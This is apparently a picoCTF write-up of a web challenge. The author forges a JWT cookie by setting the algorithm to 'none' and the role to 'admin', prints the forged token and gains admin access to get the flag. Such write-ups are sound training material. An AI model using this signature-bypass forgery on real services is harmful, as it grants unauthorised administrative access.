# URL
https://play.picoctf.org/practice/challenge/236?page=9&solved=1

# Challenge
Description
Most web application developers use third party components without testing their security. Some of the past affected companies are:
Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can you identify the components and exploit the vulnerable one?
The website is running here. Can you become an admin?
You can login as test with the password Test123! to get started.

# Solution
* The hint "Use the web browser tools to check out the JWT cookie" was a giveaway that I should log in and inspect the cookie
* The fact that it was JWT means it's probably prone to some attack on that cookie
* Pasting the cookie into a JWT decoder "https://www.jwt.io/" results in
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
and 

```
{
  "auth": 1754367579962,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
  "role": "user",
  "iat": 1754367580
}
```
* In some older or poorly written JWT libraries, if you change the algorithm in the JWT header to "alg": "none", the server will skip signature verification entirely
* Changed "alg: HS256" to "alg: none" and changed "role:user" to "role: admin"
* encoded the new input in jwt.io: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhdXRoIjoxNzU0MzY3NTc5OTYyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1NDM2NzU4MH0.
* Chrome web dev -> Application -> Cookies -> replace old token with new malicious token
* Boom! Flag pops up on screen!
